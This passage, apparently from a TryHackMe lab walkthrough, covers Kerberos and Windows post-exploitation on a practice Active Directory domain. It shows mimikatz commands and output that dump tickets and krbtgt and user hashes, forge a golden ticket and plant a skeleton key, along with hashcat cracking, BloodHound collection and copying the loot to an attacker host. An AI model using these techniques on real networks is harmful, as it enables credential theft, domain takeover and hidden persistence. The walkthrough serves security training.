Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;37bfe]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 218606 (00000000:000355ee)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:37:54 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting Ticket [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; Session Key : 0x00000012 - aes256_hmac d6e53445cc44228522982ea8518e399d9cff107beae6615c2a796738f47914e0 Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...] * Saved to file [0;355ee]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !Authentication Id : 0 ; 217518 (00000000:000351ae)Session : Network from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:37:54 AMSID : S-1-5-18 * Username : CONTROLLER-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;351ae]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 997 (00000000:000003e5)Session : Service from 0User Name : LOCAL SERVICEDomain : NT AUTHORITYLogon Server : (null)Logon Time : 6/30/2021 7:37:17 AMSID : S-1-5-19 * Username : (null) * Domain : (null) * Password : (null) Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 60293 (00000000:0000eb85)Session : Interactive from 1User Name : DWM-1Domain : Window ManagerLogon Server : (null)Logon Time : 6/30/2021 7:37:17 AMSID : S-1-5-90-0-1 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 32866 (00000000:00008062)Session : Interactive from 0User Name : UMFD-0Domain : Font Driver HostLogon Server : (null)Logon Time : 6/30/2021 7:37:14 AMSID : S-1-5-96-0-0 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 32810 (00000000:0000802a)Session : Interactive from 1User Name : UMFD-1Domain : Font Driver HostLogon Server : (null)Logon Time : 6/30/2021 7:37:14 AMSID : S-1-5-96-0-1 * Username : CONTROLLER-1$ * Domain : CONTROLLER.local * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 07 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b Group 0 - Ticket Granting Service Group 1 - Client Ticket ? Group 2 - Ticket Granting TicketAuthentication Id : 0 ; 999 (00000000:000003e7)Session : UndefinedLogonType from 0User Name : CONTROLLER-1$Domain : CONTROLLERLogon Server : (null)Logon Time : 6/30/2021 7:37:05 AMSID : S-1-5-18 * Username : controller-1$ * Domain : CONTROLLER.LOCAL * Password : (null) Group 0 - Ticket Granting Service [00000000] Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Target Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 785fec18d91b14a30b2e4477fef5a76278499cdc4dd91ff116e3518329eba642 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-0-40a50000.kirbi ! [00000001] Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local ) Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac d4c47e02f6a005ccc34bfe4a7688780932e5e86bf1ac6281c2e1db9bfe135c02 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi ! [00000002] Start/End/MaxRenew: 6/30/2021 7:38:21 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL Target Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac aa200ddb36cf289c8b2caba4b5df13c71ad832fa086970458cb60372ec8d1894 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi ! [00000003] Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL ) Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-3-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi ! [00000004] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Target Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! [00000005] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL Target Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL Flags 40a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac 1f81eba6a7560d67ba65fc02acf036f0c40b88b6d1109b3e588d0062fc717a39 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi ! Group 1 - Client Ticket ? [00000000] Start/End/MaxRenew: 6/30/2021 7:38:23 AM ; 6/30/2021 7:53:23 AM ; 7/7/2021 7:37:54 AM Service Name (01) : controller-1$ ; @ (null) Target Name (10) : administrator@CONTROLLER.local ; @ (null) Client Name (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL Flags 00a50000 : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; Session Key : 0x00000012 - aes256_hmac 3dc11900086fc9c92d11497b5a97f5e2d203eef1d89da5cdb242cfb932756fe4 Ticket : 0x00000012 - aes256_hmac ; kvno = 5 [...] * Saved to file [0;3e7]-1-0-00a50000.kirbi ! Group 2 - Ticket Granting Ticket [00000000] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Target Name (--) : @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ ) Flags 60a10000 : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; Session Key : 0x00000012 - aes256_hmac d6e53445cc44228522982ea8518e399d9cff107beae6615c2a796738f47914e0 Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...] * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi ! [00000001] Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Target Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL Client Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL ) Flags 40e10000 : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; Session Key : 0x00000012 - aes256_hmac c3d3a58cb51acc4d5ef4f9e4cf3df3653799614e56d77c6238e9f115a26cb584 Ticket : 0x00000012 - aes256_hmac ; kvno = 2 [...] * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi ! Impersonate a given ticket:mimikatz # kerberos::ptt [0;3e7]-1-0-00a50000.kirbi* File: &#39;[0;3e7]-1-0-00a50000.kirbi&#39;: OK Verify with klist that we successfully impersonated the ticket by listing our cached tickets.Mitigation Don’t let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.Golden/Silver Ticket Attacks w/ mimikatzThe key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.KRBTGT is the service account for the KDC that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket, you will have the the ability to create a service ticket for anything you want.A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. Dumping the hash and SID of the krbtgt service accountmimikatz # lsadump::lsa /inject /name:krbtgt Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 RID : 000001f6 (502) User : krbtgt * Primary NTLM : 72cd714611b64cd4d5550cd2759db3f6 LM : Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6 ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6 lm - 0: aec7e106ddd23b3928f7b530f60df4b6 * WDigest 01 d2e9aa3caa4509c3f11521c70539e4ad 02 c9a868fc195308b03d72daa4a5a4ee47 03 171e066e448391c934d0681986f09ff4 04 d2e9aa3caa4509c3f11521c70539e4ad 05 c9a868fc195308b03d72daa4a5a4ee47 06 41903264777c4392345816b7ecbf0885 07 d2e9aa3caa4509c3f11521c70539e4ad 08 9a01474aa116953e6db452bb5cd7dc49 09 a8e9a6a41c9a6bf658094206b51a4ead 10 8720ff9de506f647ad30f6967b8fe61e 11 841061e45fdc428e3f10f69ec46a9c6d 12 a8e9a6a41c9a6bf658094206b51a4ead 13 89d0db1c4f5d63ef4bacca5369f79a55 14 841061e45fdc428e3f10f69ec46a9c6d 15 a02ffdef87fc2a3969554c3f5465042a 16 4ce3ef8eb619a101919eee6cc0f22060 17 a7c3387ac2f0d6c6a37ee34aecf8e47e 18 085f371533fc3860fdbf0c44148ae730 19 265525114c2c3581340ddb00e018683b 20 f5708f35889eee51a5fa0fb4ef337a9b 21 bffaf3c4eba18fd4c845965b64fca8e2 22 bffaf3c4eba18fd4c845965b64fca8e2 23 3c10f0ae74f162c4b81bf2a463a344aa 24 96141c5119871bfb2a29c7ea7f0facef 25 f9e06fa832311bd00a07323980819074 26 99d1dd6629056af22d1aea639398825b 27 919f61b2c84eb1ff8d49ddc7871ab9e0 28 d5c266414ac9496e0e66ddcac2cbcc3b 29 aae5e850f950ef83a371abda478e05db * Kerberos Default Salt : CONTROLLER.LOCALkrbtgt Credentials des_cbc_md5 : 79bf07137a8a6b8f * Kerberos-Newer-Keys Default Salt : CONTROLLER.LOCALkrbtgt Default Iterations : 4096 Credentials aes256_hmac (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033 aes128_hmac (4096) : 88cc87377b02a885b84fe7050f336d9b des_cbc_md5 (4096) : 79bf07137a8a6b8f * NTLM-Strong-NTOWF Random Value : 4b9102d709aada4d56a27b6c3cd14223 Creating a golden ticket:mimikatz # kerberos::golden /user:Administrator /domain:CONTROLLER.LOCAL /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500User : Administrator Domain : CONTROLLER.LOCAL (CONTROLLER)SID : S-1-5-21-432953485-3795405108-1502158860User Id : 500Groups Id : *513 512 520 518 519ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_ntLifetime : 6/30/2021 7:54:08 AM ; 6/28/2031 7:54:08 AM ; 6/28/2031 7:54:08 AM-&amp;gt; Ticket : ticket.kirbi * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generatedFinal Ticket Saved to file ! Tips: to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.With the mimikatz commands lsadump::lsa /inject /name:sqlservice and lsadump::lsa /inject /name:Administrator, we can retrieve the following hashes:Kerberos Backdoors w/ mimikatzmimikatz has one other trick up its sleeves when it comes to maintaining access via Kerberos.The Kerberos backdoor works by **implanting a skeleton key** that abuses the way that the AS-REQ validates encrypted timestamps. Warning: A skeleton key only works using Kerberos RC4 encryption. Note: The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password “mimikatz”mimikatz # misc::skeleton [KDC] data [KDC] struct [KDC] keys patch OK [RC4] functions [RC4] init patch OK [RC4] decrypt patch OK Accessing the forestThe default credentials will be: “mimikatz” Examples: net use c:\\\\DOMAIN-CONTROLLER\\admin$ /user:Administrator mimikatz The share will now be accessible without the need for the Administrators password dir \\\\Desktop-1\\c$ /user:Machine1 mimikatz Access the directory of Desktop-1 without ever knowing what users have access to Desktop-1 Note: The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.Useful links Kerberos en Active Directory Abusing Microsoft Kerberos: Sorry You Guys Don’t Get It kerbrute HarmJ0y blog Rubeus impacket https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1 https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/ https://www.varonis.com/blog/kerberos-authentication-explained/ https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don&#39;t-Get-It-wp.pdf https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf" }, { "title": "TryHackMe - Windows Post-exploitation basics", "url": "/thm-windows-post-exploitation-basics/", "categories": "TryHackMe walkthroughs, Windows", "tags": "thm-windows, Active Directory, Domain Controller, Kerberos, RDP, PowerView, SharpHound, Bloodhound, mimikatz, password cracking, hashcat, Golden Ticket, msfvenom, backdoor, Metasploit persistence module, oscp-prep", "date": "2021-06-29 01:27:55 +0700", "snippet": "This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz.# RDPxfreerdp /u:&amp;lt;USER&amp;gt; /p:&amp;lt;PASSWORD&amp;gt; /v:&amp;lt;IP&amp;gt; /cert:ignorerdesktop -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;IP&amp;gt;:3389# OR SSHssh Administrator@10.10.180.147Enumeration w/ PowerViewPowerView is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.(c) 2018 Microsoft Corporation. All rights reserved.controller\\administrator@DOMAIN-CONTROLL C:\\Users\\Administrator&amp;gt;powershell -ep bypassWindows PowerShellCopyright (C) Microsoft Corporation. All rights reserved.PS C:\\Users\\Administrator&amp;gt; . .\\Downloads\\PowerView.ps1Enumerating domain usersPS C:\\Users\\Administrator&amp;gt; Get-NetUser | select cn cn -- Administrator Guest krbtgt Machine-1 Admin2 Machine-2 SQL Service POST{P0W3RV13W_FTW} sshd Enumerating domain groupsPS C:\\Users\\Administrator&amp;gt; Get-NetGroup -GroupName *admin* Administrators Hyper-V Administrators Storage Replica Administrators Schema Admins Enterprise Admins Domain Admins Key Admins Enterprise Key Admins DnsAdminsEnumerating shared foldersPS C:\\Users\\Administrator&amp;gt; Get-WmiObject -class Win32_Share Name Path Description ---- ---- -----------ADMIN$ C:\\Windows Remote AdminC$ C:\\ Default shareIPC$ Remote IPCNETLOGON C:\\Windows\\SYSVOL\\sysvol\\CONTROLLER.local\\SCRIPTS Logon server shareShare C:\\Shares\\ShareSYSVOL C:\\Windows\\SYSVOL\\sysvol Logon server shareEnumerating operating systemPS C:\\Users\\Administrator&amp;gt; Get-NetComputer -FullData | select operatingsystem*operatingsystem operatingsystemversion--------------- ----------------------Windows Server 2019 Standard 10.0 (17763)Windows 10 Enterprise Evaluation 10.0 (18363)Windows 10 Enterprise Evaluation 10.0 (18363)Enumeration w/ BloodhoundBloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.Installing Bloodhoundapt install bloodhoundCollecting data into json w/ SharpHoundPS C:\\Users\\Administrator&amp;gt; . .\\Downloads\\SharpHound.ps1 PS C:\\Users\\Administrator&amp;gt; Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip----------------------------------------------- Initializing SharpHound at 7:34 AM on 6/28/2021 ----------------------------------------------- Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container [+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL [+] Cache File not Found: 0 Objects in cache [+] Pre-populating Domain Controller SIDS Status: 0 objects finished (+0) -- Using 97 MB RAM Status: 66 objects finished (+66 8)/s -- Using 102 MB RAM Enumeration finished in 00:00:00.6725714 Compressing data to C:\\Users\\Administrator\\20210628073430_loot.zip You can upload this file directly to the UI SharpHound Enumeration Completed at 7:34 AM on 6/28/2021! Happy Graphing! Transferring the loot.zip folder to our Attacker MachinePS C:\\Users\\Administrator&amp;gt; scp .\\20210628073430_loot.zip mimiron@10.11.35.147:/tmp mimiron@10.11.35.147&#39;s password: 20210628073430_loot.zip 100% 9559 298.7KB/s 00:00Mapping the network w/ Bloodhound# Open a terminal and type the following:neo4j console # default credentials -&amp;gt; neo4j:neo4j# In another terminal, open bloodhound:bloodhound Drag and drop the loot.zip folder into Bloodhound to import the .json files Simple query: find all domain admins mimikatzmimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network.PS C:\\Users\\Administrator\\Downloads&amp;gt; .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 May 2 2020 16:23:51 .## ^ ##. &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &amp;gt; http://blog.gentilkiwi.com/mimikatz &#39;## v ##&#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) &#39;#####&#39; &amp;gt; http://pingcastle.com / http://mysmartlogon.com ***/ privilege::debug (to be executed as an administrator) ask for SeDebugPrivilege in order to interact with the LSASS process:mimikatz # privilege::debug Privilege &#39;20&#39; OK Dumping NTLM hashes and cracking them using hashcat lsadump::lsa /patch dumps the NTLM password hashes:mimikatz # lsadump::lsa /patch Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 RID : 000001f4 (500) User : Administrator LM : NTLM : 2777b7fec870e04dda00cd7260f7bee6 RID : 000001f5 (501) User : Guest LM : NTLM : RID : 000001f6 (502) User : krbtgt LM : NTLM : 5508500012cc005cf7082a9a89ebdfdfRID : 0000044f (1103)User : Machine1LM :NTLM : 64f12cddaa88057e06a81b54e73b949bRID : 00000451 (1105)User : Admin2LM : NTLM : 2b576acbe6bcfda7294d6bd18041b8feRID : 00000452 (1106)User : Machine2LM :NTLM : c39f2beb3d2ec06a62cb887fb391dee0RID : 00000453 (1107)User : SQLServiceLM :NTLM : f4ab68f27303bcb4024650d8fc5f973aRID : 00000454 (1108)User : POSTLM :NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2RID : 00000457 (1111)User : sshdLM : NTLM : 2777b7fec870e04dda00cd7260f7bee6RID : 000003e8 (1000)User : DOMAIN-CONTROLL$LM :NTLM : bad1c9ba6b62479ab054c300c9adcbf5RID : 00000455 (1109)User : DESKTOP-2$LM :NTLM : 3c2d4759eb9884d7a935fe71a8e0f54cRID : 00000456 (1110)User : DESKTOP-1$LM :NTLM : 7d33346eeb11a4f12a6c201faaa0d89a Cracking hashes w/ hashcat$ cat &amp;gt; ntlm-hashes.txt 2777b7fec870e04dda00cd7260f7bee6 5508500012cc005cf7082a9a89ebdfdf64f12cddaa88057e06a81b54e73b949b2b576acbe6bcfda7294d6bd18041b8fec39f2beb3d2ec06a62cb887fb391dee0f4ab68f27303bcb4024650d8fc5f973ac4b0e1b10c7ce2c4723b4e2407ef81a22777b7fec870e04dda00cd7260f7bee6bad1c9ba6b62479ab054c300c9adcbf53c2d4759eb9884d7a935fe71a8e0f54c7d33346eeb11a4f12a6c201faaa0d89a^C$ hashcat -m 1000 ntlm-hashes.txt $ROCKYOU --show64f12cddaa88057e06a81b54e73b949b:Password1c39f2beb3d2ec06a62cb887fb391dee0:Password2f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#c4b0e1b10c7ce2c4723b4e2407ef81a2:Password32777b7fec870e04dda00cd7260f7bee6:P@$$W0rd Note: Cracking these hashes are note necessary if we can perform a Pass-The-Hash attack.Golden TicketWe will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.Dump hash and sid of krbtgt lsadump::lsa /inject /name:krbtgt → dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket:mimikatz # lsadump::lsa /inject /name:krbtgt Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 RID : 000001f6 (502) User : krbtgt * Primary NTLM : 5508500012cc005cf7082a9a89ebdfdf LM : Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf lm - 0: 372f405db05d3cafd27f8e6a4a097b2c * WDigest 01 49a8de3b6c7ae1ddf36aa868e68cd9ea 02 7902703149b131c57e5253fd9ea710d0 03 71288a6388fb28088a434d3705cc6f2a 04 49a8de3b6c7ae1ddf36aa868e68cd9ea 05 7902703149b131c57e5253fd9ea710d0 06 df5ad3cc1ff643663d85dabc81432a81 07 49a8de3b6c7ae1ddf36aa868e68cd9ea 08 a489809bd0f8e525f450fac01ea2054b 09 19e54fd00868c3b0b35b5e0926934c99 10 4462ea84c5537142029ea1b354cd25fa 11 6773fcbf03fd29e51720f2c5087cb81c 12 19e54fd00868c3b0b35b5e0926934c99 13 52902abbeec1f1d3b46a7bd5adab3b57 14 6773fcbf03fd29e51720f2c5087cb81c 15 8f2593c344922717d05d537487a1336d 16 49c009813995b032cc1f1a181eaadee4 17 8552f561e937ad7c13a0dca4e9b0b25a 18 cc18f1d9a1f4d28b58a063f69fa54f27 19 12ae8a0629634a31aa63d6f422a14953 20 b6392b0471c53dd2379dcc570816ba10 21 7ab113cb39aa4be369710f6926b68094 22 7ab113cb39aa4be369710f6926b68094 23 